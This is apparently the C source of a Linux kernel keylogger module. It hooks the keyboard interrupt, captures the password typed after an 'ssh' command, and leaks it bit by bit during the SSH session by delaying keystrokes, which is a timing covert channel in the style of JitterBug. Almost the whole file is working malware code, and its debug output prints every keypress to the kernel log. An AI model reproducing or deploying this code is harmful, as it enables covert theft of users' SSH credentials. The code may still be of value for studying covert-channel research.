#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/interrupt.h>
#include <linux/keyboard.h>
#include <linux/delay.h>
#include <linux/time.h>
#include <linux/init.h>

/* ============= DATA ============= */

/* Keyboard */
#define KBD_IRQ      1
#define KBD_DATA_REG 0x60

unsigned char keymap[128] = {
  0,
  27,   // Escape
  '1',
  '2',
  '3',
  '4',
  '5',
  '6',
  '7',
  '8',
  '9',
  '0',
  '-',
  '=',
  '\b', // Backspace
  '\t', // Tab
  'q',
  'w',
  'e',
  'r',
  't',
  'y',
  'u',
  'i',
  'o',
  'p',
  '[',
  ']',
  '\n', // Enter
  0,    // Left Control
  'a',
  's',
  'd',
  'f',
  'g',
  'h',
  'j',
  'k',
  'l',
  ';',
  '\'', 
  '~',
  0,    // Left Shift
  '\\',
  'z',
  'x',
  'c',
  'v',
  'b',
  'n',
  'm',
  ',',
  '.',
  '/',
  0,   // Right Shift
  '*',
  0,   // Alt
  ' ', // Space Bar
  0,   // Caps lock
  0,   // 59 - F1 key ... >
  0,   0,   0,   0,   0,   0,   0,   0,
  0,   // < ... F10
  0,   // 69 - Num lock
  0,   // Scroll Lock
  0,   // Home key
  0,   // Up Arrow
  0,   // Page Up
  '-',
  0,   // Left Arrow
  0,
  0,   // Right Arrow
  '+',
  0,   // 79 - End key
  0,   // Down Arrow
  0,   // Page Down
  0,   // Insert Key
  0,   // Delete Key
  0,   0,   0,
  0,   // F11 Key
  0,   // F12 Key
  0,   // All other keys are undefined
};

unsigned char skeymap[128] = { 0 };

static bool shifted = false; // Is user holding shift?

/* State */
#define MAX_LINE_SZ  256
static unsigned char line[MAX_LINE_SZ];
static int line_len;

static unsigned char pass[MAX_LINE_SZ];
static int pass_len;

typedef enum { IDLE, ENTERING_PASSWD, CONNECTED } conn_state;
static conn_state current_st = IDLE;

static int jitter_char_idx = 0;
static int jitter_bit_idx = 0;
static bool first_packet = true;

/* Time */
static struct timeval last;

/* ============= CODE ============= */

/* KEYBOARD UTIL */
unsigned char map_key(unsigned char scancode) {
  if (shifted) {
    return skeymap[scancode];
  }

  return keymap[scancode];
}

/* COMPARE UTIL */

// Takes two "strings" (may not be null-terminated), returns true if first len characters match
bool match_prefix(unsigned char *a, unsigned char *b, int len) {
  int i;

  for (i = 0; i < len; i++) {
    if (a[i] != b[i]) {
      return false;
    }
  }

  return true;
}


/* TIME UTIL */

/* Given two timevals, one later and one earlier, compute elapsed time in milliseconds */
time_t get_milli_diff(struct timeval *later, struct timeval *earlier) {
  time_t elapsed_sec;
  suseconds_t elapsed_micro;

  elapsed_sec = later->tv_sec - earlier->tv_sec;
  elapsed_micro = later->tv_usec - earlier->tv_usec;

  return (elapsed_sec * 1000 + (elapsed_micro / 1000));
}

/* Stateful; Computes elapsed time in milliseconds between now and last time that update_time() was called */
time_t update_time(void) {
  struct timeval curr;
  time_t elapsed_milli;

  do_gettimeofday(&curr);

  elapsed_milli = get_milli_diff(&curr, &last);

  last = curr;

  return elapsed_milli;
}

/* JITTERBUG UTIL */

void put_line(unsigned char c) {
  if (c == '\b' && 0 < line_len) {
    line[--line_len] = '\0';
  }

  line[line_len++] = c;

  return;
}

void reset_line(void) {
  memset(line, '\0', MAX_LINE_SZ);
  line_len = 0;
}

void put_pass(unsigned char c) {
  if (c == '\b' && 0 < pass_len) {
    pass[--pass_len] = '\0';
  }

  pass[pass_len++] = c;
}

void reset_pass(void) {
  memset(pass, '\0', MAX_LINE_SZ);
  pass_len = 0;
}

void reset_jitter(void) {
  jitter_char_idx = 0;
  jitter_bit_idx = 0;

  first_packet = true;

  return;
}

/* JITTERBUG */

void jitterbug(void) {
  // Current time
  struct timeval entry;

  unsigned char char_to_send;

  // Timing Window
  time_t window = 40;

  time_t elapsed;
  time_t m;

  if (pass_len < jitter_char_idx) { // we've already transmitted the whole password
    return;
  }

  entry = last;

  char_to_send = pass[jitter_char_idx];

  elapsed = update_time();

  if (first_packet) { // Don't delay the first packet, because we don't have a elapsed time yet
    first_packet = false;
    return;
  }

  printk(KERN_INFO "Elapsed (before delay): %ld milli\n", elapsed);

  m = elapsed % window;

  if (char_to_send & (0x01 << (7 - jitter_bit_idx))) { // Send a '1'
    printk(KERN_INFO "!! 1\n");
    mdelay((window - m) + (window / 2));
  } else { // Send a '0'
    printk(KERN_INFO "!! 0\n");
    mdelay(window - m);
  }

  update_time();

  printk(KERN_INFO "Elapsed (after delay): %ld milli\n", get_milli_diff(&last, &entry));

  if (jitter_bit_idx == 7) {
    jitter_bit_idx = 0;
    jitter_char_idx++;
  } else {
    jitter_bit_idx++;
  }

  return;
}

irqreturn_t kbd_interrupt(int irq, void *dummy) {
  unsigned char scancode;
  unsigned char curr_char;

  scancode = inb(KBD_DATA_REG);

  if (scancode == 0x2a) { // Shift press
    printk(KERN_INFO "Shift pressed!\n");
    shifted = true;
    return IRQ_HANDLED;
  }

  if (scancode == 0xaa) { // Shift release
    printk(KERN_INFO "Shift released!\n");
    shifted = false;
    return IRQ_HANDLED;
  }

  if (scancode & 0x80) { // Something that isn't shift was released, we don't care
    return IRQ_HANDLED;
  }

  curr_char = map_key(scancode);

  printk(KERN_INFO "%u pressed!\n", curr_char);

  if (current_st == IDLE) {
    if (curr_char == '\n') {
      if (match_prefix(line, "ssh ", 4)) {
        printk(KERN_INFO "TRANSITION: IDLE -> ENTERING_PASSWD\n");

        current_st = ENTERING_PASSWD;
      }

      reset_line();
    } else {
      put_line(curr_char);
    }
  }

  else
  if (current_st == ENTERING_PASSWD) {
    if (curr_char == '\n') {
      printk(KERN_INFO "TRANSITION: ENTERING_PASSWD -> CONNECTED\n");

      current_st = CONNECTED;
    } else {
      put_pass(curr_char);
    }
  }

  else
  if (current_st == CONNECTED) {
    if (curr_char == '\n') {
      if (match_prefix(line, "exit", 4)) {
        printk(KERN_INFO "TRANSITION: CONNECTED -> IDLE\n");

        current_st = IDLE;

        reset_pass();
        reset_jitter();
      }

      reset_line();
    } else {
      put_line(curr_char);
      jitterbug();
    }
  }

  return IRQ_HANDLED;
}
  

int __init keylog_init(void) {
  printk(KERN_INFO "Hello, world!\n");

  memset(line, '\0', MAX_LINE_SZ);
  line_len = 0;

  memset(pass, '\0', MAX_LINE_SZ);
  pass_len = 0;

  request_irq(KBD_IRQ, kbd_interrupt, IRQF_SHARED, "keyboard", (void *) kbd_interrupt);

  return 0;
}

void __exit keylog_exit(void) {
  free_irq(KBD_IRQ, (void *) kbd_interrupt);
  printk(KERN_INFO "Goodbye, world!\n");

  return;
}

module_init(keylog_init);
module_exit(keylog_exit);
